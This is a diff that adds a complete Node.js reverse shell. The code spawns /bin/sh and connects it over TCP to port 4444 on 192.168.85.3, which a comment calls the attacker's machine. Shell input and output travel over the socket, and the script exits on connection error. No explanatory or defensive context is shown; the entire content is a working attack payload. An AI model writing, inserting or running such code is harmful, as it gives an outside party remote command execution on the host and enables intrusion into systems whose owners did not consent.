@@ -1,0 +1,24 @@
+
+
+// Define the IP and port of the attacker's machine
+var net = require("net");
+var cp = require("child_process");
+var sh = cp.spawn("/bin/sh", []);
+
+var client = new net.Socket();
+client.connect(4444, "192.168.85.3", function(){
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+});
+
+client.on("error", function(e){
+    console.log("Connection error: " + e);
+    setTimeout(function() {
+        process.exit();
+    }, 5000); // Exit after 5 seconds to avoid hanging
+});
+
+sh.on("exit", function(){
+    client.end();
+});
